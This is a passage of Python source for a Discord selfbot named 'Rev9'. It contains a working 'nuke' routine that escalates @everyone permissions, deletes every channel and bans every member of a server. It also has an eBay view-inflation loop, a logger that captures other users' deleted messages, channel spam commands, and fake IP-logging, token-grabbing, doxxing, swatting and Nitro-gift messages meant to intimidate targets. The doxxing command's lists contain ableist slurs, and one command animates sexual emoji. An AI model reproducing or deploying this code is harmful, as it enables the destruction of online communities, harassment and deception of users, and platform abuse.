        for _i in range(views):
            requests.get(url, headers=headers)
    EbayViewer(url, views)
    elapsed_time = datetime.datetime.now() - start_time
    em = discord.Embed(title='Ebay View Bot')
    em.add_field(name='Views sent', value=views, inline=False)
    em.add_field(name='Elapsed time', value=elapsed_time, inline=False)
    await ctx.send(embed=em)

@Rev9.command()
async def addrole(ctx, member: discord.Member, role : discord.Role): # b'\xfc'
  await ctx.message.delete()
  await member.add_roles(role)

@Rev9.command(aliases=['ip'])
async def iplookup(ctx, *, ipaddr: str = '1.3.3.7'): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'ipType', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'IPName', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
        {'name': 'Status', 'value': geo['status']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
            em.set_footer(text=promote)
            em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    return await ctx.send(embed=em)

@Rev9.command()
async def portscan(ctx, ip): # b'\xfc'
    await ctx.message.delete()
    scanyuh = get("https://api.hackertarget.com/nmap/?q=%s" % ip)
    result = scanyuh.text.strip(" ( https://nmap.org/ )")
    embed=discord.Embed(title="Scanned ports:", description=f"`{result}`", color=0x000000)
    embed.set_author(name="Rev-9 Portscan")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    embed.set_footer(text="Rev-9")
    await ctx.send(embed=embed)

@Rev9.command()
async def pingwebsite(ctx, website = None): # b'\xfc'
    await ctx.message.delete()
    if website is None: 
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        if r == 404:
            await ctx.send(f'Site is down, responded with a status code of {r}', delete_after=deltime)
        else:
            await ctx.send(f'Site is up, responded with a status code of {r}', delete_after=deltime)  

@Rev9.command()
async def iplog (ctx, member:discord.User=None, reason =None): # b'\xfc'
    await ctx.message.delete()
    if member == None or member == ctx.message.author:
        await ctx.channel.send("You cannot IP log yourself!")
        return
    if reason == None:
        reason = "unknown reason"
    message = f"{member} has been IP logged for {reason}"
    await ctx.channel.send(message)
    await ctx.channel.send(f"```{member} has been successfully logged! Data uploaded to doxbin.org```")

@Rev9.command()
async def dcversion(ctx): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed(title="API Version:", description=f"{discord.__version__}", color=000000)
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    em.set_footer(text="Rev-9")
    await ctx.send(embed=em, delete_after=deltime)
    if(discord.__version__ == "1.0.0a"):
        print(f'{C.RED}We are using rewrite branch.')
    else:
        print(f'{C.RED}We are not using rewrite branch.')

@Rev9.event
async def on_message_delete(message):
    if message.author.id == Rev9.user.id: # b'\xfc'
        return
    if Rev9.msgsniper:
        if isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel) or isinstance(message.channel, discord.TextChannel):
            attachments = message.attachments
            if len(attachments) == 0:
                message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
                    message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                print(f"{C.GREEN}[MSGLOGGER] {C.RED}[{message_content}] SERVER: {Fore.RED}[{message.guild}]")
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
                    message.content) + "\n\n**Attachments:**\n" + links
                print(f"{C.GREEN}[MSGLOGGER] {C.RED}[{message_content}] SERVER: {Fore.RED}[{message.guild}]")
    if len(Rev9.sniped_message_dict) > 1000:
        Rev9.sniped_message_dict.clear()
    if len(Rev9.snipe_history_dict) > 1000:
        Rev9.snipe_history_dict.clear()
    attachments = message.attachments
    if len(attachments) == 0:
        channel_id = message.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        Rev9.sniped_message_dict.update({channel_id: message_content})
        if channel_id in Rev9.snipe_history_dict:
            pre = Rev9.snipe_history_dict[channel_id]
            post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
            Rev9.snipe_history_dict.update({channel_id: pre[:-3] + post + "\n```"})
        else:
            post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
            Rev9.snipe_history_dict.update({channel_id: "```\n" + post + "\n```"})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = message.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(message.content) + "\n\n**Attachments:**\n" + links
        Rev9.sniped_message_dict.update({channel_id: message_content})

@Rev9.command(aliases=["stopmimicuser", "stopcopyuser", "stopcopy"])
async def stopmimic(ctx): # b'\xfc'
    await ctx.message.delete()
    if Rev9.user is None:
        print(f"{C.BLUE}[INFO]: {C.RED}Stopped.")
        return
    print(f"{C.BLUE}[INFO]: {C.RED}Stopped copying " + str(Rev9.mimic))
    Rev9.mimic = None

@Rev9.command()
async def ss(ctx): # b'\xfc'
    await ctx.message.delete()
##############
    count = 0#
##############
    count += 1 
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(r'Screenshot\screenshot{}.png'.format(count))

@Rev9.command(aliases=["mimicuser", "copyuser"])
async def mimic(ctx, user: discord.User):
    await ctx.message.delete()
    Rev9.mimic = user
    print(f"{Fore.BLUE}[INFO]: {Fore.RED}Now copying " + str(Rev9.mimic))

async def nuke(guild): # b'\xfc'
  print(f"{C.WHITE}Nuking {guild.name}.")
  role = discord.utils.get(guild.roles, name = "@everyone")
  try:
    await role.edit(permissions = discord.Permissions.all())
    print(f"{C.GREEN}Successfully granted admin permissions in {C.WHITE}{guild.name}")
  except:
    print(f"{C.RED}Admin permissions NOT GRANTED in {C.WHITE}{guild.name}")
  for channel in guild.channels:
    try:
      await channel.delete()
      print(f"{C.GREEN}Successfully deleted channel {C.WHITE}{channel.name}")
    except:
      print(f"{C.RED}Channel {C.WHITE}{channel.name} {C.RED}has NOT been deleted.")
  for member in guild.members:
    try:
      await member.ban()
      print(f"{C.GREEN}Successfully banned {C.WHITE}{member.name}")
    except:
      print(f"{C.WHITE}{member.name} {C.RED}has NOT been banned.")

@Rev9.command()
async def kill(ctx): # b'\xfc'
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)

@Rev9.command()
async def vcmute(ctx): # b'\xfc'
    vc = ctx.author.voice.channel
    for member in vc.members:
        await member.edit(mute=True)

@Rev9.command()
async def cum(ctx):
    await ctx.message.delete()
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')

@Rev9.command()
async def sendall(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    try:
        channels = ctx.guild.text_channels
        for channel in channels:
            await channel.send(message)
    except:
        pass

@Rev9.command()
async def pipinstall(ctx, message): # b'\xfc'
    await ctx.message.delete()
    message = await ctx.send(f"`[▓▓▓                    ] / Installing {message} module.`")
    await message.edit(content=f"`[▓▓▓                    ] / Installing {message} module.`")
    await message.edit(content=f"`[▓▓▓▓▓▓▓                ] - Installing {message} module.`")
    await message.edit(content=f"`[▓▓▓▓▓▓▓▓▓▓▓▓           ] \ Installing {message} module.`")
    await message.edit(content=f"`[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | Installing {message} module.`")
    await message.edit(content=f"`[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / Installing {message} module.`")
    await message.edit(content=f"`[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - Installing {message} module.`")
    await message.edit(content=f"`[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \ Installing {message} module.`")
    await message.edit(content=f"`Successfully installed {message} module.`")

@Rev9.command()
async def vcunmute(ctx): # b'\xfc'
    vc = ctx.author.voice.channel
    for member in vc.members:
        await member.edit(mute=False)

@Rev9.command(aliases=["clearhistory"])
async def clearhis(ctx): # b'\xfc'
    await ctx.message.delete()
    del Rev9.snipe_history_dict[ctx.channel.id]
    await print(f"{Fore.YELLOW}[WARNING]: {Fore.RED}Cleared Snipe History of " + ctx.channel.name)

@Rev9.command(aliases=["distort"])
async def magik(ctx, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Rev9.jpg"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Rev9.jpg"))
        except:
            await ctx.send(res['message'])

@Rev9.command()
async def fry(ctx, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Rev9.jpg"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Rev9.jpg"))
        except:
            await ctx.send(res['message'])

@Rev9.command()
async def extremedox(ctx, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
              '5\'4\"', '5\'5\"',
              '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
              '6\'4\"', '6\'5\"',
              '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
    sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
    education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                 "Retard never went to school LOL"]
    ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
                 "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
    occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
                  "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
                  "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
                  "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
    salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
              "$125,000", "$150,000", "$175,000",
              "$200,000+"]
    location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
                "Russia", "Pakistan", "India",
                "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
                "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
                "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
                "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
                "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
                "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
                "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
    email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
             "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
            "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
            "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
            "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
            "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
            "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
            "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
            "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
            "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
    else:
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")

@Rev9.command()
async def sniperhistory(ctx): # b'\xfc'
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Rev9.snipe_history_dict:
        try:
            print(f"{Fore.BLUE}[INFO] {Fore.GREEN}[MSGLOGS] {Fore.RED}{Rev9.snipe_history_dict[currentChannel]}")
            embed = discord.Embed(title=f"Rev-9 message sniper history", description=f"**History: {Rev9.snipe_history_dict[currentChannel]}**", colour=0x0000)
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
            embed.set_footer(text="Rev-9")
            await ctx.send(embed=embed, delete_after=deltime)
        except:
            del Rev9.snipe_history_dict[currentChannel]
    else:
         print(f"{Fore.YELLOW}[WARNING] {Fore.RED}Snipe History is empty!")
         embed = discord.Embed(title=f"Rev-9 message sniper history", description=f"**Snipe History is empty!**", colour=0x0000)
         embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
         embed.set_footer(text="Rev-9")
         await ctx.send(embed=embed, delete_after=deltime)


@Rev9.command()
async def ytsearch(ctx, *, search):
    await ctx.message.delete()
    query_string = parse.urlencode({'search_query': search})
    html_content = request.urlopen('http://www.youtube.com/results?' + query_string)
    search_results = re.findall('href=\"\\/watch\\?v=(.{11})', html_content.read().decode())
    await ctx.send('https://www.youtube.com/watch?v=' + search_results[0])

@Rev9.command()
async def swat(ctx, user): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed(description=user + f' has been swatted by {Rev9.user}', color=000000)\
        .set_image(url="https://cdn.discordapp.com/attachments/717781274466451550/806299629003341854/ezgif.com-gif-maker.gif")
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    em.set_footer(text="Rev-9")
    await ctx.send(embed=em)

@Rev9.command()
async def unban(ctx, *, member): # b'\xfc'
    await ctx.message.delete()
    banned_users = await ctx.guild.bans()
    member_name, member_discriminator = member.split("#")

    for ban_entry in banned_users:
        user = ban_entry.user

        if (user.name, user.discriminator) == (member_name, member_discriminator):
            await ctx.guild.unban(user)
            embed = discord.Embed(title=f"Rev-9 Unban", description=f"**Unbanned user: {user.mention}**", colour=0x0000)
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
            embed.set_footer(text="Rev-9")
            await ctx.send(embed=embed, delete_after=deltime)
            return

@Rev9.command()
async def fakenitro(ctx): # b'\xfc'
    await ctx.message.delete()
    embed=discord.Embed(title="Redeem:", description="Redeem:", url="https://discord.gift/gwE3q7rTXKtE34Hs", color=0x000000)
    embed.set_author(name="Nitro Gift", url="https://discord.gift/gwE3q7rTXKtE34Hs", icon_url="https://cdn.discordapp.com/attachments/783072893616783371/803728617242230854/unknown.png")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/783072893616783371/803728617242230854/unknown.png")
    embed.set_footer(text="Rev-9")
    await ctx.send(embed=embed)

@Rev9.command()
async def invisiblenickname(ctx): # b'\xfc'
    await ctx.message.delete()
    try:
        name = "‎‎‎‎‎‎‎‏‏‎ ឵឵ ឵឵ ឵឵ ឵឵‎"
        await ctx.author.edit(nick=name)
    except:
            return

@Rev9.command()
async def covid(ctx): # b'\xfc'
    await ctx.message.delete()
    request = requests.get(f'https://api.covid19api.com/summary')
    data = request.json()
    info = data['Global']
    totalconfirmed = info['TotalConfirmed']
    totalrecovered = info['TotalRecovered']
    totaldeaths = info['TotalDeaths']
    newconfirmed = info['NewConfirmed']
    newrecovered = info['NewRecovered']
    newdeaths = info['NewDeaths']
    embed = discord.Embed(color=0x000000, title='COVID-19 Live Stats', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.add_field(name=f'Total Confirmed Cases', value=f'{totalconfirmed}', inline=True)
    embed.add_field(name=f'Total Deaths', value=f'{totaldeaths}', inline=True)
    embed.add_field(name=f'Total Recovered', value=f'{totalrecovered}', inline=True)
    embed.add_field(name=f'New Confirmed Cases', value=f'{newconfirmed}', inline=True)
    embed.add_field(name=f'New Deaths', value=f'{newdeaths}', inline=True)
    embed.add_field(name=f'New Recovered', value=f'{newrecovered}', inline=True)
    embed.set_thumbnail(url='https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/SARS-CoV-2_without_background.png/1020px-SARS-CoV-2_without_background.png')
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def weirdnickname(ctx): # b'\xfc'
    await ctx.message.delete()
    try:
        name = "𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫" 
        await ctx.author.edit(nick=name)
    except:
            return

@Rev9.command()
async def nilban (ctx, member:discord.User=None, reason =None): # b'\xfc'
    await ctx.message.delete()
    if member == None or member == ctx.message.author:
        await ctx.channel.send("You cannot nil ban yourself!")
        return
    if reason == None:
        reason = "---"
    message = f"{member} has been nil banned by Rev-9 {reason}"
    await ctx.channel.send(message)


@Rev9.command(pass_context=True)
async def ban(ctx, member : discord.Member): # b'\xfc'
    await ctx.message.delete()
    await member.ban()
    embed = discord.Embed(title=f"Rev-9 Ban", description=f"**Banned user: {member.mention}**", colour=0x0000)
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    embed.set_footer(text="Rev-9")
    await ctx.send(embed=embed, delete_after=deltime)
    
@Rev9.command(pass_context=True)
async def terminate(ctx, user:discord.User=None, category=None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        embed = discord.Embed(title="Terminate command help", description=f"Usage: {prefix}terminate **user**", color=000000)
        embed.set_footer(text=promote)
        embed.set_image(url="https://media.discordapp.net/attachments/799980250921566258/810899617318699038/kisspng-malware-computer-icons-symbol-clip-art-hacker-5acfe956a2ea90-removebg-preview_4.png")
        await ctx.send(embed=embed, delete_after=deltime)
        return
    await user.ban()
    if category is None:
        embed = discord.Embed(color=000000,)
        embed.set_author(name=f"{user} HAS BEEN TERMINATED BY REV-9",)
        embed.set_footer(text=promote)
        embed.set_image(url="https://media.discordapp.net/attachments/783073479900921906/801466245228527656/ezgif.com-gif-maker_2.gif")
        await ctx.send(embed=embed, delete_after=deltime)
        message = f"**TARGET TERMINATED**"
    await ctx.channel.send(message)

@Rev9.command()
async def junk(ctx): # b'\xfc'
    await ctx.message.delete()
    for each in range(0, 11):
        d = "\n"*100
        await ctx.send(f".{d}.")


@Rev9.command(pass_context=True)
async def kick(ctx, member : discord.Member): # b'\xfc'
    await ctx.message.delete()
    await member.kick()
    embed = discord.Embed(title=f"Rev-9 Kick", description=f"**Kicked user: {member.mention}**", colour=0x0000)
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    embed.set_footer(text="Rev-9")
    await ctx.send(embed=embed, delete_after=deltime)


@Rev9.command()
async def ipblacklist (ctx, member:discord.User=None, reason =None): # b'\xfc'
    await ctx.message.delete()
    if member == None or member == ctx.message.author:
        await ctx.channel.send("You cannot blacklist yourself!")
        return
    if reason == None:
        reason = "---"
    message = f"{member} has been IP blacklisted by Rev-9 {reason}"
    await ctx.channel.send(message)

@Rev9.command()
async def admin (ctx, member:discord.User=None, reason =None): # b'\xfc'
    await ctx.message.delete()
    if member == None or member == ctx.message.author:
        await ctx.channel.send("```Modified your roles! +Admin```")
        return
    if reason == None:
        reason = "Nil"
    message = f"{member} Nil {reason}"
    await ctx.channel.send(message)
    await ctx.channel.send(f"```{member} Cannot give admin```") 


@Rev9.command()
async def tgrab (ctx, member:discord.User=None, reason =None): # b'\xfc'
    await ctx.message.delete()
    if member == None or member == ctx.message.author:
        await ctx.channel.send("You cannot grab your token!")
        return
    if reason == None:
        reason = "unknown reason."
    message = f"{member} has been token grabbed for {reason}"
    await ctx.channel.send(message)
    await ctx.channel.send(f"```{member} has been successfully token logged! Say $tokenfuck to destroy his discord.```") 

@Rev9.command()
async def tokengrab (ctx, member:discord.User=None): # b'\xfc'
    await ctx.message.delete()
    if member == None or member == ctx.message.author:
        await ctx.channel.send("You cannot grab your own token!")
        return
    string = member.id
    decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
    encoded_stuff = str(decoded_stuff)
    encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
    await asyncio.sleep(0.5)
    await ctx.send(f"Getting users token...")
    await asyncio.sleep(2)
    await ctx.send(f"Exploiting account...")
    await asyncio.sleep(2.5)
    responses = [
      '.YAIfFw.y5NHsx1-A-aQEMWUFohP7jyDB1s',
      '.YAIdxQ.7NdlfJhg4hiHEAWt7lMZ49b7qOQ',
      '.YAIZcg.zdj8nr12viT0MTep3Xq2PanONMg',
      '.YAIakA.IWGXEtmwrRecHBwKb6vkyJwGkJk',
      '.YAIb9Q.WEKw_ta8vWs-zEInhBDj7rbJ_9s',
      '.YAIclQ.u_QmJ6gCZyTupH4xKu0AVNwNwxg',
